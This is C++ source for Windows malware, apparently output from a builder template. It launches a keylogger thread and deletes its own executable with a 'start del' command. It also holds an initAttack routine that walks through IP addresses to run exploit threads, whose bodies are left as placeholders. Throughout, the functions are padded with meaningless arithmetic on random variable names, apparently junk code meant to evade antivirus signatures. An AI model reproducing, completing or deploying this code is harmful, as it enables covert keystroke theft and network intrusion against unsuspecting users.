#include "testo4.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//[ninjaModule]
	if(argc==0){/*normal process*/
	//
std::vector<DWORD> arr_dwThreadIdModule;
std::vector<HANDLE> arr_hThreadModule;
HANDLE hThread = NULL;
DWORD dwTID = 0;
        //Moudule Keylogger
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger, NULL, 0, &dwTID);
int iqrEg2rkMKQ = 0x1d461dd;
int iIPDt5CSgDg = 0x87efe5a;
int ixighkUzCzB = 0xc7d04f2;
int iggU1eJH0wm = iqrEg2rkMKQ + iIPDt5CSgDg - ixighkUzCzB;
iggU1eJH0wm = 0x44ce87f * iggU1eJH0wm + 0x79e65fc - iIPDt5CSgDg;
int i6ce1Ioym57 = iggU1eJH0wm / 0x79e65fc + iqrEg2rkMKQ ^ ixighkUzCzB - 0xc7d04f2;

        if (hThread != INVALID_HANDLE_VALUE)
        {
            arr_hThreadModule.push_back(hThread);
            arr_dwThreadIdModule.push_back(dwTID);
        }
WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);
for (int i = 0; i < arr_hThreadModule.size(); i++) {
if(arr_hThreadModule[i])
CloseHandle(arr_hThreadModule[i]);
int i5buajVDoY5 = 0xc29272f;
int igNG2DP0ddV = 0xc638dd6;
int i8j4OvYFVGg = i5buajVDoY5 + igNG2DP0ddV;

}

	
	//[mainExploit]	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}

void SelfDelete(){
	char out[MAX_PATH];
	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
int i3MH7lQlvS4 = 0xcaa411b;
int ieWq9AlFxX8 = 0x261586f;
int iRzIxeniwLO = 0x224cd52;
int iQnU5nShNnb = iRzIxeniwLO * ieWq9AlFxX8 + i3MH7lQlvS4;
ieWq9AlFxX8 = 0x53d1e10 - iQnU5nShNnb + 5 + 0x7d87972 + 69 - i3MH7lQlvS4;
i3MH7lQlvS4 = 0xcaa411b + 10 - ieWq9AlFxX8 % 10 + 0x224cd52 + 999 - iQnU5nShNnb;
iQnU5nShNnb = i3MH7lQlvS4 % 5 + iRzIxeniwLO % 0x261586f + 0xcafebabe + i3MH7lQlvS4;
iRzIxeniwLO = 0xcaa411b * 0x100 - i3MH7lQlvS4 + 56 ^ 0x261586f + 1996 - iRzIxeniwLO;
int i6G38WjKhr8 = iRzIxeniwLO / 77 + 0x224cd52 - 76 / iRzIxeniwLO ^ 0x33 % iRzIxeniwLO % 0x224cd52;
i6G38WjKhr8 = 0x7d87972 * 0x10 - 22 + i6G38WjKhr8 + 56 ^ 0xff + ieWq9AlFxX8 + 1996 - 2111 + iRzIxeniwLO;

	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
int iIhzUfhZK95;
int iOe5c8I41gd = 0x6f5a7c9;
int irtW5BFM8yd = 0xac8c181;
int izGcN3nGy6X = 0xabdc367;
for(iIhzUfhZK95 = 0; iIhzUfhZK95 < 3; iIhzUfhZK95++)
{
    iOe5c8I41gd = iIhzUfhZK95 * 99 - 1000 * irtW5BFM8yd + 0x456 ^ 0x573a47a % 5 - 0x62dd645;
    irtW5BFM8yd = iIhzUfhZK95 * 3 + izGcN3nGy6X + 0x30 + 0xabdc367 % 123 - irtW5BFM8yd;
    izGcN3nGy6X = iIhzUfhZK95 * 4 - 0xac8c181 + 0xff / 0x123 - 0xabdc367 % 234 - 0x62dd645;
}
int iEzFS3HzXxZ = izGcN3nGy6X - iOe5c8I41gd * irtW5BFM8yd + 0xabdc367;
iEzFS3HzXxZ = iIhzUfhZK95 - 50 + 100 - 0xac8c181 ^ 99 * 0x0f - 0xabdc367 % 2 - 3575 + 0x62dd645;

	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
int ihCncjMuFGy = 0xf0f0f2b;
int icWNbFxIvH1 = 0xca53fab;
int iZIgO8WnRwf = 0x8c074aa;
int iF2zkXGvZD1 = ihCncjMuFGy + icWNbFxIvH1 - iZIgO8WnRwf;
iF2zkXGvZD1 = 0x8e7c0c1 * iF2zkXGvZD1 + 0x7ed11d2 - icWNbFxIvH1;
int iRyJAtB5Avc = iF2zkXGvZD1 / 0x7ed11d2 + ihCncjMuFGy ^ iZIgO8WnRwf - 0x8c074aa;

	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
int infTbWhdf9k = 0x4b9a55e;
int iX4zSyfiRKe = 0x3392290;
int iS6wbU9FwdZ = infTbWhdf9k + iX4zSyfiRKe;

				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
int izeY5IbL1Xx = 0x89acfaa;
int ifHIBW9wiHo = 0xbb04789;
int iOQIC9jVEfz = 0x6b0df1c;
int iKczj5lBSM9 = iOQIC9jVEfz * ifHIBW9wiHo + izeY5IbL1Xx;
ifHIBW9wiHo = 0xa331fa0 + iKczj5lBSM9 + 0x557bf15 + izeY5IbL1Xx;
int i5zVDmPTppj = izeY5IbL1Xx / 0xbb04789 - iOQIC9jVEfz ^ iOQIC9jVEfz ^ 0x6b0df1c;

				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
int iWPpXn3ydxa = 0xc3ff83b;
int ij8uj4lSjHp = 0xbf24ae2;
int iuoR5LSarZe = 0xb691fb5;
int iYyzItgSGsO = iWPpXn3ydxa + ij8uj4lSjHp - iuoR5LSarZe;
iYyzItgSGsO = 0x08b05e4 * iYyzItgSGsO + 0x08add10 - ij8uj4lSjHp;
int i44Ho1vfFfU = iYyzItgSGsO / 0x08add10 + iWPpXn3ydxa ^ iuoR5LSarZe - 0xb691fb5;

					argc++;
				}
				_argv[j] = a;
				j++;
int iCii4Xvw0ym;
int iGn3PHBixNB = 0xbbea6c3;
int i1KUpwiJ49j = 0x70ed786;
int iSCFLxzuReH = 0x724b06f;
for(iCii4Xvw0ym = 0; iCii4Xvw0ym < 3; iCii4Xvw0ym++)
{
    iGn3PHBixNB = iCii4Xvw0ym * 99 - 1000 * i1KUpwiJ49j + 0x456 ^ 0x5595df1 % 5 - 0xdb555a1;
    i1KUpwiJ49j = iCii4Xvw0ym * 3 + iSCFLxzuReH + 0x30 + 0x724b06f % 123 - i1KUpwiJ49j;
    iSCFLxzuReH = iCii4Xvw0ym * 4 - 0x70ed786 + 0xff / 0x123 - 0x724b06f % 234 - 0xdb555a1;
}
int i88tA7v3EFD = iSCFLxzuReH - iGn3PHBixNB * i1KUpwiJ49j + 0x724b06f;
i88tA7v3EFD = iCii4Xvw0ym - 50 + 100 - 0x70ed786 ^ 99 * 0x0f - 0x724b06f % 2 - 3575 + 0xdb555a1;

				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
int iJofGHeq3NM = 0x8c7377d;
int ilxw5mZ8qb5 = 0xfb251ee;
int iLHLhB517hf = 0xefba80e;
int iGhrZGok6v6 = iJofGHeq3NM + ilxw5mZ8qb5 - iLHLhB517hf;
iGhrZGok6v6 = 0x5a4b780 * iGhrZGok6v6 + 0xf2a3837 - ilxw5mZ8qb5;
int imyxbcCJcuI = iGhrZGok6v6 / 0xf2a3837 + iJofGHeq3NM ^ iLHLhB517hf - 0xefba80e;

	return argv;
}
int initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;
int iFKl2kT3bFW = 0x4a19bc4;
int iX6vnxTC98X = 0x5f5bbbf;
int iTqu3FYOf7R = 0x797a82e;
int i3BEotwNJUM = iTqu3FYOf7R * iX6vnxTC98X + iFKl2kT3bFW;
iX6vnxTC98X = 0xd00daa5 - i3BEotwNJUM + 5 + 0x0f5b960 + 69 - iFKl2kT3bFW;
iFKl2kT3bFW = 0x4a19bc4 + 10 - iX6vnxTC98X % 10 + 0x797a82e + 999 - i3BEotwNJUM;
i3BEotwNJUM = iFKl2kT3bFW % 5 + iTqu3FYOf7R % 0x5f5bbbf + 0xcafebabe + iFKl2kT3bFW;
iTqu3FYOf7R = 0x4a19bc4 * 0x100 - iFKl2kT3bFW + 56 ^ 0x5f5bbbf + 1996 - iTqu3FYOf7R;
int iY5PXqCAvaF = iTqu3FYOf7R / 77 + 0x797a82e - 76 / iTqu3FYOf7R ^ 0x33 % iTqu3FYOf7R % 0x797a82e;
iY5PXqCAvaF = 0x0f5b960 * 0x10 - 22 + iY5PXqCAvaF + 56 ^ 0xff + iX6vnxTC98X + 1996 - 2111 + iTqu3FYOf7R;


	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
int iWfXHHAbb4U = 0x0056db0;
int iK31ZAehRpC = 0x161f7b8;
int i7CetzlSm4v = 0xab84690;
int iZb3inkghp8 = i7CetzlSm4v * iK31ZAehRpC + iWfXHHAbb4U;
iK31ZAehRpC = 0x78590df - iZb3inkghp8 + 5 + 0x10da01b + 69 - iWfXHHAbb4U;
iWfXHHAbb4U = 0x0056db0 + 10 - iK31ZAehRpC % 10 + 0xab84690 + 999 - iZb3inkghp8;
iZb3inkghp8 = iWfXHHAbb4U % 5 + i7CetzlSm4v % 0x161f7b8 + 0xcafebabe + iWfXHHAbb4U;
i7CetzlSm4v = 0x0056db0 * 0x100 - iWfXHHAbb4U + 56 ^ 0x161f7b8 + 1996 - i7CetzlSm4v;
int i59c22elp1Y = i7CetzlSm4v / 77 + 0xab84690 - 76 / i7CetzlSm4v ^ 0x33 % i7CetzlSm4v % 0xab84690;
i59c22elp1Y = 0x10da01b * 0x10 - 22 + i59c22elp1Y + 56 ^ 0xff + iK31ZAehRpC + 1996 - 2111 + i7CetzlSm4v;

	
	//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
    return 1;
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
int iJRHbT7JdS3 = 0xe2572c8;
int ibZJCFFauYw = 0x5ae609a;
int i7fEDBiKDTI = 0x34b9337;
int ic1GvdZ9gQo = iJRHbT7JdS3 + ibZJCFFauYw - i7fEDBiKDTI;
ic1GvdZ9gQo = 0xfa46235 * ic1GvdZ9gQo + 0x45cf38d - ibZJCFFauYw;
int ir1stUGbrkl = ic1GvdZ9gQo / 0x45cf38d + iJRHbT7JdS3 ^ i7fEDBiKDTI - 0x34b9337;

	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
